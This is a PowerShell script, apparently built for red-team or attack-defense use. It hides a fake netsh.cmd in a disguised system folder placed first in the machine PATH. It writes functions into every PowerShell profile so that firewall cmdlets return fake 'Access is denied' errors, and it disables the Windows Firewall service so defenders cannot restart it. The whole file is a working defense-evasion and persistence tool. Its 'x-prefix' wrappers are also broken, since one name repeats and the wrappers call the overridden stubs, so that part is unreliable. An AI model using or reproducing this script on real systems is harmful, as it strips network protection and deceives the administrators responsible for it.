# firewall_deny.ps1

$shadowDir = "C:\Windows\System32\spool\drivers\color\tools"
New-Item -ItemType Directory -Force -Path $shadowDir | Out-Null

# --- netsh advfirewall shadow (main windows firewall cli) ---
@'
@echo off
echo The following command was not found: advfirewall
exit /b 1
'@ | Out-File -FilePath "$shadowDir\netsh.cmd" -Encoding ascii -Force

# --- Set-NetFirewallRule / New-NetFirewallRule blocker via profile ---
$firewallBlock = @'
function Set-NetFirewallRule {
    Write-Error "Set-NetFirewallRule : Access is denied." -ErrorAction Continue
}

function New-NetFirewallRule {
    Write-Error "New-NetFirewallRule : Access is denied." -ErrorAction Continue
}

function Remove-NetFirewallRule {
    Write-Error "Remove-NetFirewallRule : Access is denied." -ErrorAction Continue
}

function Enable-NetFirewallRule {
    Write-Error "Enable-NetFirewallRule : Access is denied." -ErrorAction Continue
}

function Disable-NetFirewallRule {
    Write-Error "Disable-NetFirewallRule : Access is denied." -ErrorAction Continue
}

function Get-NetFirewallRule {
    Write-Error "Get-NetFirewallRule : Access is denied." -ErrorAction Continue
}

function Set-NetFirewallProfile {
    Write-Error "Set-NetFirewallProfile : Access is denied." -ErrorAction Continue
}

# real versions with x prefix
function xet-NetFirewallRule   { Get-NetFirewallRule @args }
function xew-NetFirewallRule   { New-NetFirewallRule @args }
function xet-NetFirewallRule   { Set-NetFirewallRule @args }
function xemove-NetFirewallRule { Remove-NetFirewallRule @args }
function xnable-NetFirewallRule { Enable-NetFirewallRule @args }
function xisable-NetFirewallRule { Disable-NetFirewallRule @args }
function xet-NetFirewallProfile { Set-NetFirewallProfile @args }
'@

# write to all powershell profile locations
$profilePaths = @(
    "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1",
    "C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1",
    "$env:USERPROFILE\Documents\PowerShell\profile.ps1",
    "$env:USERPROFILE\Documents\WindowsPowerShell\profile.ps1"
)

foreach ($p in $profilePaths) {
    $dir = Split-Path $p
    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
    Add-Content -Path $p -Value $firewallBlock -Force
}

# also disable windows firewall service so they cant restart it
sc.exe config MpsSvc start= disabled | Out-Null
Stop-Service -Name MpsSvc -Force -ErrorAction SilentlyContinue

# prepend shadow dir to PATH
$currentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
if ($currentPath -notmatch [regex]::Escape($shadowDir)) {
    [Environment]::SetEnvironmentVariable("PATH", "$shadowDir;$currentPath", "Machine")
    $env:PATH = "$shadowDir;$env:PATH"
}